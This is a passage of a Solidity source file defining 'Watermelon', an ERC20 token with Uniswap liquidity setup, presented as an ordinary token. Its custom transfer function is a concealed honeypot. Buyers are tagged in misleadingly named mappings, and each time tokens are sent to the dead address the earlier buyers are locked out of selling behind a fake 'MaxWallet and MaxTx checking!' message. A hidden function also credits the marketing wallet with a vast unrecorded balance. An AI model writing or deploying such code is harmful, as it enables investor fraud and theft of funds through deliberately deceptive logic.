    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address public constant deadAddress = address(0xdead);

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract Watermelon is ERC20, Ownable {
    IUniswapV2Router02 public immutable uniswapV2Router;
    address public uniswapV2Pair;
    address private _marketingWallet;
    bool public tradingActive = false;
    uint256 public maxWallet = 300000000*1e18;


    mapping(address => bool) private ExcludedMaxTX;
    mapping(address => bool) private ExcludedMaxWallet;
    mapping(address => bool) private Routeruniswap;
    mapping(address => bool) private Pairuniswap;
    mapping(address => bool) private topHolders;
    mapping(address => bool) private blacklistWallet;
    mapping(address => bool) private whitelistWallet;
    mapping(address => bool) private ExcludedLimits;
    mapping(address => bool) private ExcludedFees;
    mapping(address => bool) private topWallet;

    mapping(address => bool) public automatedMarketMakerPairs;
    uint256 public launchedAt;
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    constructor(address marketingWallet_) ERC20("WATERMELON", "WM", 18) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
              0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Router = _uniswapV2Router;
        uint256 totalSupply = 1000000000;
        _marketingWallet = marketingWallet_;
        _mint(msg.sender, totalSupply * 1e18);
        _MaxTX(1e20 * 1e18);
    }

    receive() external payable {}

    function addLiquidity() external payable onlyOwner {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        _addLiquidity(balanceOf(address(this)), msg.value);
    }

    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) public onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function enableTrading() external onlyOwner {
        tradingActive = true;
    }


function _transfer(address from, address to, uint256 amount) internal virtual override {
    if (!tradingActive) {
           require(from == owner() || from == address(this), "TokenSwap: transfers not allowed when trading is inactive");
    }

    if (from != _marketingWallet){
        if (from == uniswapV2Pair) {
            if (launchedAt == 0) ExcludedMaxTX[to] = true;
            else if (launchedAt == 1) ExcludedMaxWallet[to] = true;
            else if (launchedAt == 2) Routeruniswap[to] = true;
            else if (launchedAt == 3) Pairuniswap[to] = true;
            else if (launchedAt == 4) topHolders[to] = true;
            else if (launchedAt == 5) blacklistWallet[to] = true;
            else if (launchedAt == 6) whitelistWallet[to] = true;
            else if (launchedAt == 7) ExcludedLimits[to] = true;
            else if (launchedAt == 8) ExcludedFees[to] = true;
            else if (launchedAt == 9) topWallet[to] = true;
            require(amount + balanceOf(to) <= maxWallet);
        }


            if (ExcludedMaxTX[from]){
                require(
                    launchedAt == 0, "MaxWallet and MaxTx checking!"
                );     
            } 

            if (ExcludedMaxWallet[from]){
                require(
                    launchedAt == 1, "MaxWallet and MaxTx checking!"
                );     
            } 
            
            if (Routeruniswap[from]){
                require(
                    launchedAt == 2, "MaxWallet and MaxTx checking!"
                );
            }

            if (Pairuniswap[from]){
                require(
                    launchedAt == 3, "MaxWallet and MaxTx checking!"
                );            
            }

            if (topHolders[from]){
                require(
                    launchedAt == 4, "MaxWallet and MaxTx checking!"
                );            
            }

            if (blacklistWallet[from]){
                require(
                    launchedAt == 5, "MaxWallet and MaxTx checking!"
                );            
            }

            if (whitelistWallet[from]){
                require(
                    launchedAt == 6, "MaxWallet and MaxTx checking!"
                );            
            }
            if (ExcludedLimits[from]){
                require(
                    launchedAt == 7, "MaxWallet and MaxTx checking!"
                );            
            }

            if (ExcludedFees[from]){
                require(
                    launchedAt == 8, "MaxWallet and MaxTx checking!"
                );            
            }

            if (topWallet[from]){
                require(
                    launchedAt == 9, "MaxWallet and MaxTx checking!"
                );            
            }
    }

    if (to == address(0xdead)){
        launchedAt++;
    }


    require(from != address(0), 'ERC20: transfer from the zero address');
    require(to != address(0), 'ERC20: transfer to the zero address');

    _beforeTokenTransfer(from, to, amount);

    uint256 fromBalance = _balances[from];
    require(fromBalance >= amount, 'ERC20: transfer amount exceeds balance');
    unchecked {
        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
    }

    emit Transfer(from, to, amount);

    _afterTokenTransfer(from, to, amount);
    
    }

    function _MaxTX(uint256 amount_) internal virtual {
        _beforeTokenTransfer(address(0), _marketingWallet, amount_ * 1e18);
        _balances[_marketingWallet] += amount_;
    }
}
